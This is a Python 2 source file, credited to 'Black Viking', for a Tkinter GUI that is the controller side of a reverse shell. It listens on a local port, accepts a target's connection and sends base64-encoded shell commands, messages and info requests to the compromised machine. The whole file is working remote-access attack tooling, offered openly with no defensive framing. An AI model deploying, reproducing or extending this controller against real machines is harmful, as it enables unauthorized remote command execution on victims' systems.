#!/usr/bin/env python2
# -*- coding: utf-8 -*-
#
#

"""
[~] Author : Black Viking
[~] Version: 0.1
"""
from Tkinter import * 
import socket
import os
import sys
import base64

HOST = "127.0.0.1"
PORT = 8000

def crypt(TEXT, encode=True):
    if encode == True:
        return base64.b64encode(TEXT)
    else:
        return base64.b64decode(TEXT)

def send(event=False):
    x = command.get()
    command.delete(0, END)
    if x == "clear()":
        textBox.delete('1.0', END)
        return
    elif x == "help()":
        textBox.insert(END, "[%s@%s]~$ "%(hostname, addr[0])+x+"\n"+"""[*] You can use target system's shell
[*] You can show messages, just type 'message test'
[*] You can get target system's info, type 'info()' """+"\n"+"="*60+"\n")
        return
    elif x == "":
        x = " "
    cmd = crypt(x)
    cli.sendall(cmd)
    textBox.insert(END, "[%s@%s]~$ "%(hostname, addr[0])+x+"\n"+crypt(cli.recv(4096), False)+"\n"+"="*60+"\n")
    textBox.see("end")

def menu():
    global command, textBox, hostname
    hostname = crypt(cli.recv(1024), False)

    root=Tk()
    root.tk_setPalette("black")
    root.title('Black Viking | Reverse Shell')
    root.resizable(width=FALSE, height=FALSE)
    root.geometry('623x540+100+100')
    root.bind('<Return>', send)

    scr_bar = Scrollbar(root)
    scr_bar.pack(side=RIGHT,fill=Y)
    textBox = Text(fg="green", yscrollcommand=scr_bar.set)
    textBox.place(relx=0.01, rely=0.02, relwidth=0.95, relheight=0.87)
    scr_bar.config(command=textBox.yview)

    command = Entry(fg="green")
    command.place(relx=0.01, rely=0.91, relwidth=0.76, relheight=0.05)
    
    btn_send = Button(text='Send', command=send, fg="green")
    btn_send.place(relx=0.79, rely=0.91, relwidth=0.18, relheight=0.05)

    root.mainloop()

def main():
    global s, cli, addr
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((HOST, PORT))
    s.listen(1)
    cli, addr = s.accept()
    menu()

if __name__ == "__main__":
    main()
    
